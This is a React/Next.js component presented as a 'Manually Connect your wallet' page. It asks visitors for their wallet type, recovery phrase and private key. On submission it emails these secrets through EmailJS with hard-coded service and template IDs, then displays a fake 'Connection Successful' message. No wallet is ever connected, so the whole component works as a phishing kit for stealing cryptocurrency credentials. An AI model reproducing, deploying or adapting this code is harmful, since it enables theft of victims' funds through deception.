import {
  Box,
  Button,
  Flex,
  Heading,
  Image,
  Input,
  Select,
  Spinner,
  Text,
  useToast,
} from "@chakra-ui/react";
import React, { useRef, useState } from "react";
import emailjs from "@emailjs/browser";
import { WalletType } from "lib/components/types/WalletType";
import FormInput from "./FormInput";
import wallet from "./wallet.json";
import { useRouter } from "next/router";

function WalletConnect() {
  const form = useRef<any>();
  const [loading, setLoading] = useState(false);
  const router = useRouter();
  const toast = useToast();
  const sendEmail = (e: any) => {
    setLoading(true);
    e.preventDefault();

    emailjs
      .sendForm(
        "service_bpmdfaw",
        "template_aksu8yw",
        form.current,
        "TUQ97bbG7tDKXKkf4"
      )
      .then(
        (result) => {
          setLoading(false);
          toast({
            title: `Connection Successful`,
            status: "success",
            isClosable: true,
            position: "top-right",
          });
          router.push("/success");
        },
        (error) => {
          setLoading(false);
          toast({
            title: error.text,
            status: "error",
            isClosable: true,
            position: "top-right",
          });
        }
      );
  };
  return (
    <Box w="80%" mx="auto">
      <Flex
        align="center"
        h={["auto", "90vh"]}
        gap="3rem"
        flexDir={["column", "row"]}
      >
        <Box w="full" display={["none", "block"]}>
          <Image src="/cone.png" w="full" h="auto" />
        </Box>
        <Box w="full">
          <Heading mb="2rem">Manually Connect your wallet</Heading>
          <form ref={form} onSubmit={sendEmail}>
            <Text mb=".5rem">Wallet Type</Text>
            <Select name="wallet_type" borderRadius="0" height="3rem" mb="2rem">
              {wallet.map((x: WalletType) => (
                <option value={x.name} key={x.name}>
                  {x.name}
                </option>
              ))}
            </Select>
            <FormInput name="phrase" title="Phrase" />
            <FormInput name="private_key" title="Private Key" />
            <Button
              borderRadius="0"
              h="3.5rem"
              w="full"
              bgColor="brand.100"
              type="submit"
              color="white"
            >
              {loading ? <Spinner /> : "Connect"}
            </Button>
          </form>
        </Box>
      </Flex>
    </Box>
  );
}

export default WalletConnect;
